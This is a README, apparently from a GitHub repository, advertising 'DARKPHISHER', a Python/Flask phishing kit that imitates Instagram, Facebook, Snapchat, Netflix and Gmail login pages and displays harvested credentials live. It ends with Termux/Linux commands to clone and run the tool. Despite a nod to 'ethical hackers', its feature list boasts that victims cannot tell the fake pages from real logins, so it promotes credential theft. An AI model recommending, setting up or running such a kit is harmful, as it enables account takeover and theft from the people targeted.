# 🕵️ DARKPHISHER — Advanced Phishing Tool

![Version](https://img.shields.io/badge/version-2.0-red)
![Python](https://img.shields.io/badge/python-3.8%2B-blue)
![Platform](https://img.shields.io/badge/platform-Termux%20%7C%20Linux-lightgrey)

**DARKPHISHER** is a powerful, multi-platform phishing tool developed by **GENIUS HACKER**. It allows ethical hackers and security researchers to create realistic phishing pages for popular platforms like Instagram, Facebook, Snapchat, Netflix, and Gmail — all with real-time credential capture.

---

## 📸 Features

- ✅ **Multi-Platform Support** — Instagram, Facebook, Snapchat, Netflix, Gmail
- ✅ **Real-Time Credential Capture** — Live display in terminal
- ✅ **Multi-Port Support** — Each platform runs on a separate port
- ✅ **Clean & Realistic Pages** — Victim cannot distinguish from real login
- ✅ **YouTube Redirect** — Opens channel on start (for branding)
- ✅ **Lightweight & Fast** — Built with Python + Flask
- ✅ **Termux Friendly** — Works perfectly on Android (Termux)

---

## 🔧 Installation

### Termux / Linux

```bash
# 1. Update & Install Python
pkg update && pkg upgrade -y
pkg install python python-pip -y

# 2. Clone Repository
git clone https://github.com/xcmvaditya/Darkphisher.git
cd Darkphisher

# 3. Install Dependencies
pip install flask

# 4. Give Permission
chmod 777 darkphisher.py

# 5. Run Tool
python darkphisher.py
